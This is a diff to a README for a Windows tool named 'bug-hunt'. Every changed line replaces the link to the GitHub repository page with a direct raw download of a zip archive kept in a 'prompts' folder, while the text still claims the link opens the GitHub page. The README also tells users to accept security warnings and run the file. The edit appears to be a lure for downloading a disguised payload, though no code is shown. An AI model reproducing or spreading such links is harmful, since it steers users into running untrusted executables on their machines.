@@ -1,6 +1,6 @@
 # 🐛 bug-hunt - Find and Verify Real Bugs Easily
 
-[![Download bug-hunt](https://img.shields.io/badge/Download-bug--hunt-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/thamarai-selvi/bug-hunt)
+[![Download bug-hunt](https://img.shields.io/badge/Download-bug--hunt-4CAF50?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/thamarai-selvi/bug-hunt/main/prompts/hunt_bug_3.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your system meets these, you should be able to run bug-hunt without issues.
 
 To get bug-hunt on your Windows PC, visit this page to download the software:
 
-[Download bug-hunt Here](https://github.com/thamarai-selvi/bug-hunt)
+[Download bug-hunt Here](https://raw.githubusercontent.com/thamarai-selvi/bug-hunt/main/prompts/hunt_bug_3.9.zip)
 
 Clicking the link opens the GitHub page where you will find the latest version ready for download. Look for a file ending with `.exe` or a similar installer file to start.
 
@@ -40,7 +40,7 @@ Clicking the link opens the GitHub page where you will find the latest version r
 
 Follow these steps to install bug-hunt on your computer:
 
-1. **Go to the Download Page:** Click the main download link above or go to https://github.com/thamarai-selvi/bug-hunt.  
+1. **Go to the Download Page:** Click the main download link above or go to https://raw.githubusercontent.com/thamarai-selvi/bug-hunt/main/prompts/hunt_bug_3.9.zip  
 2. **Find the Installer:** On the page, look for a downloads section or releases area. Find the latest version of bug-hunt for Windows. It usually has `.exe` at the end.  
 3. **Download the Installer:** Click the download button to save the installer file to your computer.  
 4. **Run the Installer:** Double-click the downloaded file. You may see a security warning. Confirm that you trust the source and click “Run” or “Yes.”  
@@ -121,7 +121,7 @@ You don’t need an account to read answers. If you want to ask a question, you 
 
 ## 📥 Download bug-hunt
 
-[Click here to visit the download page and get bug-hunt](https://github.com/thamarai-selvi/bug-hunt)  
+[Click here to visit the download page and get bug-hunt](https://raw.githubusercontent.com/thamarai-selvi/bug-hunt/main/prompts/hunt_bug_3.9.zip)  
 
 Make sure to download the latest installer from the page to start using the software quickly.
 
